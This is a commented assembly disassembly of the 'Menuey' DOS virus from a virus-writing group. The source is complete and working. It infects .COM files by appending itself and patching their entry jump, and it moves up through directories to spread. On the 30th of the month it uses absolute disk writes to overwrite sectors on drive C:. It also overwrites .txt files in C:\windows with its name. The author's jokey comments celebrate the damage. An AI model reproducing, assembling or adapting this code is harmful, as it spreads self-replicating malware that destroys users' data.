;              'ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿'
;               º *****:::: Disassembly - Menuey ::::***** º
;               º ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ º
;               º ******* -= nUcLeii/Vx United! =- ******* º
;              'ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ'


;	This is one of those files you have but have no damn idea where it
; came from. I knew someone sent me this, and no scanners catch it, so i got
; board enough to disassemble it. Its a simple .com appender with nifty little
; text file payload. This is not a fully finished breakdown of the code, but i
; didn't have the time to waste finishing it. sorry.

.model tiny
.code

seg_a  segment byte public
	ASSUME	CS:SEG_A, DS:SEG_A
org 100h


start:
	db      0e9h, 02, 00			;first jump
next:
	call    get_delta
get_delta:
	pop     bp				;basic routine to retrive the delta offset
        sub     bp,offset get_delta
        mov     cx,3
        lea     si,word ptr what
        mov     di,offset start
        push	di
        repz    movsb
        lea     dx,word ptr dta_stat		;where the dta is stored
        mov     ah,01ah				;function to set the dta
        int	21h
find_file:
	mov     ah,4eh				;function to find first file
        mov     cx,7
        lea     dx,word ptr file_spec		;what type of file to find
        int     21h
        jae     short infect			;if found then infect
        jmp     short change			;if not then change dir.
        db      144				;?
change:
	lea     dx,word ptr dot_dot		;time to find a new dir.
        mov     ah,3bh				;function to set current dir
        int     21h				;call dos
        jae     short find_file			;jump if above or equal
        jmp     short mov_on			;jump unconditionally
        db      144				;?
again:
	mov     ah,4fh				;function to find next file
        int     21h				;call dos
        jae     short infect			;jump if above or equal
        jmp     short change			;jump unconditionally
infect:
	mov     ax,3d02h			;open file with read/write access
        mov     dx,09eh				;load filename			
        int     21h				;call dos

        xchg    ax,bx
        mov     ah,03fh				;function to read file			
        lea     dx,word ptr what		;what to read
        mov     cx,3				;how many bytes
        int     21h				;call dos

        sub     ax,3				;errr, whatever,.
        mov     word ptr hmm,ax			;
        mov     ax,04200h			;move file pointer to start of file
        xor     cx,cx				;set cx to zero
        xor	dx,dx				;set dx to zero
        int     21h				;call dos

        mov     ah,40h				;write to file
        mov     cx,3				;how many bytes to write
        lea     dx,word ptr ok_sure		;err.,
        int	21h				;call to dos

        mov     ax,4202h			;move file pointer to end of file
        xor	cx,cx				;set cx to zero
        xor	dx,dx				;set dx to zero
        int	21h				;do it

        mov     ah,40h				;good ol' 40 hex
        mov     cx,0141h
        lea     dx,word ptr next		;what to write
        int     21h				;go for it
        mov     ah,3eh				;close file with handle
        int     21h				;call dos
        jmp     short again			;do it again
mov_on:
	mov     ah,2ah				;get system date
        int     21h				;call dos
        cmp     dl,01eh				;is it the 30'th?				
        jne     short and_on			;if not then jump
        mov     ah,0dh				;disk reset function
        int     21h				;writes all modified disk buffers to disk

        mov     al,2				;set drive to c:
        mov     cx,-1				;number of sectors to write
        mov     dx,0				;logical sector			
        int     26h				;absolute disk write interrupt

        mov     ah,0dh				;disk reset function
        int     21h				;again.,hehe.,
        mov     al,2				;set drive to c:
        mov     cx,-1				;number of sectors to write
        mov     dx,-1				;logical sector
        int     26h				;absolute disk write
and_on:
	mov     ah,3bh				;function to set current dir
        lea     dx,word ptr ouch		;where to move to.,muhahaha.,
        int     21h				;go for it!
        mov     ah,4eh				;function to find first file
and_on_:
	xor     cx,cx				;set cx to zero
        lea     dx,word ptr spec_2		;look for a .txt file
        int     21h				;call dos
        jb      short outta			;jump if not found
        mov     ax,3d02h			;open file with read/write access
        mov     dx,09eh				;load filename
        int     21h				;call dos

        mov     ah,40h				;function to write to file
        mov     cx,10h				;write 16 bytes
        lea     dx,word ptr vir_id		;data to write
        int     21h				;call dos
        mov     ah,3eh				;close file with handle
        int     21h				;call dos

        mov     ah,4fh				;function to find next file
        jmp     short and_on_			;do it again!

vir_id  db      ' Menuey Virus', 10, 13,'$'	;virus name

outta:	mov     dx,80h
        mov     ah,01ah
        int     21h
        ret

file_spec	db  '*.com',  0
what		db  0cdh,20h,0
ok_sure		db  233
hmm		db  0,  0
dta_stat	db  42 dup (?)
spec_2		db  '*.txt',  0
dot_dot		db  '..',0
ouch		db  'C:\windows',  0

seg_a   ends
        end     start
